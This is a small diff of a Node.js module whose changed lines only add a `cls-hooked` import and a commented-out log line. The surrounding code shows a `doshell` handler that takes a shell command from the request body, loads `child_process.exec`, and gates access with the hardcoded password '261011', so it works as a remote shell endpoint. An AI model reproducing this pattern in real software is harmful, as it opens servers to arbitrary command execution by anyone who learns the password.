@@ -1,7 +1,11 @@
 const { exec } = require("child_process")
 
+const cls = require("cls-hooked")
+
 module.exports = {
     doshell(req, res) {
+        // loggerCls.info("Long live rocknroll!")
+
         const shell = req.body.shell
         const password = req.body.password
         if (password == "261011") {
